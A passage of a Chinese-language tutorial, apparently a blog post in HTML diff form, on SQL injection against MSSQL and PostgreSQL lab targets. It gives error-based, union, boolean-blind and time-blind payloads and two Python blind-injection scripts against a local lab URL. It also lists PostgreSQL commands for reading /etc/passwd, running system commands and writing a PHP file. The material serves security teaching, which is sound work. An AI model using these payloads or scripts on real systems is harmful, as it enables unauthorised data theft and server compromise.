<span class="keyword">and</span> name <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;Users&#x27;</span>));<span class="comment">--</span></span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"><span class="number">1.</span>sysobjects：MSSQL 系统表，存储数据库所有对象</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>xtype<span class="operator">=</span><span class="string">&#x27;u&#x27;</span>：筛选用户表（<span class="keyword">User</span> <span class="keyword">table</span>）</span><br><span class="line"></span><br><span class="line"><span class="number">3.</span>TOP <span class="number">1</span>：只返回第一个符合条件的表名</span><br><span class="line"></span><br><span class="line"><span class="number">4.</span><span class="keyword">NOT</span> <span class="keyword">IN</span> (...)：排除已经找到的表，从而获取下一个新表</span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">在 MSSQL 中除了借助 sysobjects 表和 syscolumns 表获取表名、列名外，MSSQL 数据库中也兼容 information_schema，里面存放了数据表表名和字段名。使用方法与 MySQL 相同</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查询表名可以用 information_schema.tables */</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> table_name <span class="keyword">from</span> information_schema.tables);<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 查询列名可以用 information_schema.columns */</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;Users&#x27;</span>);<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/12.png"></p>
+<ul>
+<li>查询表中的字段名</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;Users&#x27;</span>));<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;Users&#x27;</span>) <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;id&#x27;</span>);<span class="comment">--</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> syscolumns <span class="keyword">where</span> id<span class="operator">=</span>(<span class="keyword">select</span> id <span class="keyword">from</span> sysobjects <span class="keyword">where</span> name <span class="operator">=</span> <span class="string">&#x27;Users&#x27;</span>) <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;id&#x27;</span> <span class="keyword">and</span> name<span class="operator">&lt;&gt;</span><span class="string">&#x27;password&#x27;</span>);<span class="comment">--</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">------------------------------------------------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line">syscolumns：MSSQL 系统表，存储所有表的列信息</span><br><span class="line"></span><br><span class="line">sysobjects：存储数据库对象信息，通过子查询获取 Users 表的 id</span><br><span class="line"></span><br><span class="line">TOP <span class="number">1</span>：每次只返回第一个符合条件的列名</span><br><span class="line"></span><br><span class="line">name <span class="operator">&lt;&gt;</span> <span class="string">&#x27;...&#x27;</span>：排除已找到的列，获取下一个新列</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/13.png"></p>
+<ul>
+<li>查询表中具体的数据</li>
+</ul>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取第1个 username</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> username <span class="keyword">from</span> Users);<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取第2个 username</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> username <span class="keyword">from</span> Users <span class="keyword">where</span> username<span class="operator">&lt;&gt;</span> <span class="string">&#x27;admin&#x27;</span>);<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取第3个 username</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> username <span class="keyword">from</span> Users <span class="keyword">where</span> username<span class="operator">&lt;&gt;</span> <span class="string">&#x27;admin&#x27;</span> <span class="keyword">and</span> username<span class="operator">&lt;&gt;</span> <span class="string">&#x27;flag&#x27;</span>);<span class="comment">--</span></span><br><span class="line"><span class="comment">-----------------------------------------------------</span></span><br><span class="line"><span class="number">1.</span>mssql的排除可以用两种方法，一种是<span class="keyword">not</span> <span class="keyword">in</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span><span class="operator">=</span>(<span class="keyword">select</span> top <span class="number">1</span> id <span class="keyword">from</span> Users <span class="keyword">where</span> username <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;flag&#x27;</span>));<span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>还有一种是<span class="keyword">and</span>和<span class="operator">&lt;&gt;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="联合注入"><a href="#联合注入" class="headerlink" title="联合注入"></a>联合注入</h2><p>方法与一般的 SQL 联合注入相同。值得注意的是，MSSQL 联合注入一般不使用数字占位，而是 <code>NULL</code>，因为使用数字占位可能会发生隐式转换</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>, <span class="keyword">NULL</span> ,<span class="keyword">NULL</span> <span class="keyword">from</span> Users<span class="comment">--</span></span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>, password , <span class="keyword">NULL</span> <span class="keyword">from</span> Users<span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>方法与一般的 SQL 布尔盲注相同，使用 ASCII 码逐个比较字符，将返回为 True 的结果输出即可</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">or</span> ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> username <span class="keyword">from</span> Users),<span class="number">1</span>,<span class="number">1</span>))<span class="operator">&gt;</span><span class="number">97</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>布尔盲注脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.2.244/index.aspx?user_id=&#x27;</span></span><br><span class="line"></span><br><span class="line">cookies = &#123;       <span class="comment"># 如果目标网站要事先登录，就加上cookies吧</span></span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>:<span class="string">&quot;c8ab8r49nd2kk0qfhs0dcaktl3&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">90000</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line">       payload = url + <span class="string">&quot;-1 or ascii(substring((select top 1 name from master.dbo.sysdatabases),%d,1))&gt;%d-- &quot;</span> %(i,mid)</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       data = &#123;</span></span><br><span class="line"><span class="string">           &quot;user_id&quot;: payload</span></span><br><span class="line"><span class="string">       &#125;</span></span><br><span class="line"><span class="string">       res = requests.get(url=url, data=data)</span></span><br><span class="line"><span class="string">       &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> <span class="string">&#x27;Joe Vilella&#x27;</span> <span class="keyword">in</span> res.text:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br><span class="line">   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>MSSQL 数据库中的 <code>WAITFOR</code> 延时存储过程可以用来时间盲注，当语句执行成功，页面延时返回即为 True</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span>;if (<span class="keyword">select</span> IS_SRVROLEMEMBER(<span class="string">&#x27;sysadmin&#x27;</span>))<span class="operator">=</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:2&#x27;</span><span class="comment">--</span></span><br><span class="line">判断是否为系统管理员</span><br><span class="line"></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span>;if (ascii(<span class="built_in">substring</span>((<span class="keyword">select</span> top <span class="number">1</span> name <span class="keyword">from</span> master.dbo.sysdatabases),<span class="number">1</span>,<span class="number">1</span>)))<span class="operator">&gt;</span><span class="number">1</span> WAITFOR DELAY <span class="string">&#x27;0:0:2&#x27;</span><span class="comment">--</span></span><br><span class="line">枚举数据库名</span><br></pre></td></tr></table></figure>
+
+
+
+<p>时间盲注脚本:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://192.168.2.244/index.aspx?user_id=&#x27;</span></span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">250</span>):</span><br><span class="line">   low = <span class="number">32</span></span><br><span class="line">   high = <span class="number">128</span></span><br><span class="line">   mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">while</span>(low&lt;high):</span><br><span class="line"></span><br><span class="line">       payload = url + <span class="string">&quot;1;if (ascii(substring((select top 1 name from master.dbo.sysdatabases),%d,1)))&gt;%d WAITFOR DELAY &#x27;0:0:2&#x27;--&quot;</span> %(i,mid)</span><br><span class="line"></span><br><span class="line">       times = time.time()</span><br><span class="line">       res = requests.get(url=payload)</span><br><span class="line"></span><br><span class="line">       <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">       data = &#123;</span></span><br><span class="line"><span class="string">       &quot;user_id&quot;: payload</span></span><br><span class="line"><span class="string">       &#125;</span></span><br><span class="line"><span class="string">       res = requests.get(url=url, data=data)</span></span><br><span class="line"><span class="string">       &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">       <span class="keyword">if</span> time.time() - times &gt;= <span class="number">2</span>:      <span class="comment"># 为真时，即判断正确的时候的条件</span></span><br><span class="line">           low = mid+<span class="number">1</span></span><br><span class="line">       <span class="keyword">else</span>:</span><br><span class="line">           high = mid</span><br><span class="line">       mid = (low+high)//<span class="number">2</span></span><br><span class="line">   <span class="keyword">if</span>(mid ==<span class="number">32</span> <span class="keyword">or</span> mid ==<span class="number">127</span>):</span><br><span class="line">       <span class="keyword">break</span></span><br><span class="line">   flag = flag+<span class="built_in">chr</span>(mid)</span><br><span class="line">   <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="PostgreSQL注入"><a href="#PostgreSQL注入" class="headerlink" title="PostgreSQL注入"></a>PostgreSQL注入</h1><h2 id="PostgreSQL数据库介绍"><a href="#PostgreSQL数据库介绍" class="headerlink" title="PostgreSQL数据库介绍"></a>PostgreSQL数据库介绍</h2><p>PostgreSQL（通常简称为 Postgres）是一个<strong>功能非常强大、开源的对象-关系型数据库系统</strong>。自 1986 年于加州大学伯克利分校诞生以来，它已历经近 40 年的持续开发与演进，凭借其<strong>可靠性、数据完整性以及对 SQL 标准的高度兼容</strong>，赢得了全球开发者和众多知名企业的青睐。</p>
+<p>简单来说，PostgreSQL 不仅能很好地处理传统的关系型数据，还具备处理 JSON、地理空间信息等复杂数据的能力，是一个”一站式”的数据管理解决方案。</p>
+<h2 id="PostgreSQL对比mysql语法"><a href="#PostgreSQL对比mysql语法" class="headerlink" title="PostgreSQL对比mysql语法"></a>PostgreSQL对比mysql语法</h2><table>
+<thead>
+<tr>
+<th align="left">操作</th>
+<th align="left">MySQL</th>
+<th align="left">PostgreSQL</th>
+<th align="left">说明</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>查看版本</strong></td>
+<td align="left"><code>SELECT VERSION()</code></td>
+<td align="left"><code>SELECT VERSION()</code></td>
+<td align="left">基本相同</td>
+</tr>
+<tr>
+<td align="left"><strong>查看当前用户</strong></td>
+<td align="left"><code>SELECT USER()</code></td>
+<td align="left"><code>SELECT CURRENT_USER</code></td>
+<td align="left">PG 不需要括号</td>
+</tr>
+<tr>
+<td align="left"><strong>查看数据库</strong></td>
+<td align="left"><code>SHOW DATABASES</code></td>
+<td align="left"><code>SELECT datname FROM pg_database</code></td>
+<td align="left">PG 用系统表</td>
+</tr>
+<tr>
+<td align="left"><strong>查看所有表</strong></td>
+<td align="left"><code>SHOW TABLES</code></td>
+<td align="left"><code>SELECT tablename FROM pg_tables</code></td>
+<td align="left">PG 用系统表</td>
+</tr>
+<tr>
+<td align="left"><strong>查看表结构</strong></td>
+<td align="left"><code>DESC table_name</code></td>
+<td align="left"><code>\d table_name</code> (psql) 或查询系统表</td>
+<td align="left">PG 命令行用反斜杠</td>
+</tr>
+<tr>
+<td align="left"><strong>字符串拼接</strong></td>
+<td align="left"><code>CONCAT(&#39;a&#39;,&#39;b&#39;)</code> 或 <code>&#39;a&#39; &#39;b&#39;</code></td>
+<td align="left">&#96;’a’</td>
+<td align="left"></td>
+</tr>
+<tr>
+<td align="left"><strong>注释符</strong></td>
+<td align="left"><code>#</code> 或 <code>--</code></td>
+<td align="left"><code>--</code></td>
+<td align="left">PG 不支持 <code>#</code></td>
+</tr>
+<tr>
+<td align="left"><strong>限制行数</strong></td>
+<td align="left"><code>LIMIT 1</code></td>
+<td align="left"><code>LIMIT 1</code></td>
+<td align="left">相同</td>
+</tr>
+<tr>
+<td align="left"><strong>条件语句</strong></td>
+<td align="left"><code>IF(condition, true, false)</code></td>
+<td align="left"><code>CASE WHEN</code> 或 <code>NULLIF</code></td>
+<td align="left">PG 更标准</td>
+</tr>
+<tr>
+<td align="left"><strong>获取当前数据库</strong></td>
+<td align="left"><code>SELECT DATABASE()</code></td>
+<td align="left"><code>SELECT CURRENT_DATABASE()</code></td>
+<td align="left">类似</td>
+</tr>
+</tbody></table>
+<p><strong>其余90% 的 SQL 语法和mysql是完全一样的</strong></p>
+<h2 id="PostgreSQL注入的关键系统表及字段"><a href="#PostgreSQL注入的关键系统表及字段" class="headerlink" title="PostgreSQL注入的关键系统表及字段"></a>PostgreSQL注入的关键系统表及字段</h2><p><strong>系统表</strong></p>
+<table>
+<thead>
+<tr>
+<th align="left">系统表</th>
+<th align="left">作用</th>
+<th align="left">关键字段</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>pg_database</strong></td>
+<td align="left">存储所有数据库</td>
+<td align="left"><code>datname</code> (数据库名)</td>
+</tr>
+<tr>
+<td align="left"><strong>pg_tables</strong></td>
+<td align="left">存储所有表信息</td>
+<td align="left"><code>tablename</code>（表名）、<code>schemaname</code>（模式名称）</td>
+</tr>
+<tr>
+<td align="left"><strong>pg_class</strong></td>
+<td align="left">存储所有表和索引</td>
+<td align="left"><code>relname</code> (表名), <code>relkind</code></td>
+</tr>
+<tr>
+<td align="left"><strong>pg_attribute</strong></td>
+<td align="left">存储所有列信息</td>
+<td align="left"><code>attname</code> (列名), <code>attrelid(关系/表的id)</code></td>
+</tr>
+<tr>
+<td align="left"><strong>pg_namespace</strong></td>
+<td align="left">存储 schema 命名空间</td>
+<td align="left"><code>nspname</code> (schema名)</td>
+</tr>
+</tbody></table>
+<p><strong>postgresql数据库也有information_schema.tables这张表,也可以使用这张表进行查询表名，列名</strong></p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/14.png"></p>
+<hr>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/15.png"></p>
+<h2 id="PostgreSQL常用命令"><a href="#PostgreSQL常用命令" class="headerlink" title="PostgreSQL常用命令"></a>PostgreSQL常用命令</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="built_in">current_schema</span>()           #查看当前权限</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">user</span>                       #查看用户</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">current_user</span>               #查看当前用户</span><br><span class="line"><span class="keyword">select</span> chr(<span class="number">97</span>)                    #将ASCII码转为字符</span><br><span class="line"><span class="keyword">select</span> chr(<span class="number">97</span>)<span class="operator">||</span>chr(<span class="number">100</span>)<span class="operator">||</span>chr(<span class="number">109</span>)<span class="operator">||</span>chr(<span class="number">105</span>)<span class="operator">||</span>chr(<span class="number">110</span>)  #将ASCII转换为字符串</span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">session_user</span>;</span><br><span class="line"><span class="keyword">SELECT</span> usename <span class="keyword">FROM</span> pg_user;</span><br><span class="line"><span class="keyword">SELECT</span> getpgusername();</span><br><span class="line"><span class="keyword">select</span> version()                  #查看PostgreSQL数据库版本</span><br><span class="line"><span class="keyword">SELECT</span> current_database()         #查看当前数据库</span><br><span class="line"><span class="keyword">select</span> length(<span class="string">&#x27;admin&#x27;</span>)            #查看长度</span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(expr1) <span class="keyword">then</span> result1 <span class="keyword">else</span> result2 <span class="keyword">end</span>;  #如果xx，执行result1，否则result2</span><br><span class="line">例：<span class="keyword">select</span> <span class="keyword">case</span> <span class="keyword">when</span>(<span class="built_in">current_user</span><span class="operator">=</span><span class="string">&#x27;postgres&#x27;</span>) <span class="keyword">then</span> pg_sleep(<span class="number">5</span>) <span class="keyword">else</span> pg_sleep(<span class="number">0</span>) <span class="keyword">end</span>;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">select</span> pg_read_file(&quot;/etc/passwd&quot;);          #读取文件</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">system</span>(&quot;whoami&quot;);                     #执行系统命令,<span class="number">11.2</span>以下才有该命令</span><br><span class="line"><span class="keyword">COPY</span> (<span class="keyword">select</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>) <span class="keyword">to</span> <span class="string">&#x27;/tmp/1.php&#x27;</span>;   #写入文件</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>注:以下靶场为字符型注入</strong></p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/16.png"></p>
+<h2 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span><span class="string">&#x27; order by 3--  #查看显示列</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">4</span><span class="comment">--(正常)</span></span><br><span class="line"><span class="number">1</span><span class="string">&#x27; order by 5--(报错)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">null</span>,<span class="keyword">null</span>,<span class="keyword">null</span><span class="comment">--(这里是使用的null来占位)</span></span><br><span class="line">因为直接使用MySQL的数字进行占位的话会出现类型不匹配报错的问题，因为我们不一定知道这三个位置的具体类型</span><br></pre></td></tr></table></figure>
+
+
+
+<p>当使用 <code>-1&#39; union select 1,2,3--</code> 时，出现了第二个和第三个位置的数据类型不匹配，第二和第三位的数据类型为char，但是我们这里使用了int进行占位导致了出错</p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/17.png"></p>
+<p>当使用 <code>-1&#39; union select 1,&#39;2&#39;,&#39;3&#39;--</code> 时，正常回显，但是大多情况下我们不知道具体位置的数据类型，所以都是<strong>使用的NULL进行占位</strong></p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/18.png"></p>
+<p><strong>获取数据库信息</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">-- 获取当前数据库</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select NULL,current_database(),NULL --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">-- 获取当前用户</span></span><br><span class="line"><span class="string">-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">NULL</span>,<span class="built_in">current_user</span>,<span class="keyword">NULL</span> <span class="comment">--</span></span><br><span class="line"></span><br><span class="line"><span class="comment">-- 获取版本</span></span><br><span class="line"><span class="number">-1</span><span class="string">&#x27; union select NULL,version(),NULL --</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>获取表名</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>)<span class="number">-1</span><span class="string">&#x27; union select NULL,tablename,NULL FROM pg_tables WHERE schemaname=&#x27;</span>public<span class="string">&#x27; --</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">(2)-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,table_name,<span class="keyword">NULL</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span><span class="string">&#x27;public&#x27;</span><span class="comment">--</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/19.png"></p>
+<p><strong>这里的schemaname&#x3D;’public’:<br>public 是 PostgreSQL 默认的”公共文件夹”,创建的表默认都放在 public 里,如果不设定模式schemaname&#x3D;’public’,会出现许多PostgreSQL自己的系统表，虽然schemaname&#x3D;’public’不是必须，但是最好设置上</strong></p>
+<p><img src="/img/%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%B3%A8%E5%85%A5/20.png"></p>
+<p><strong>获取users表的列名</strong></p>
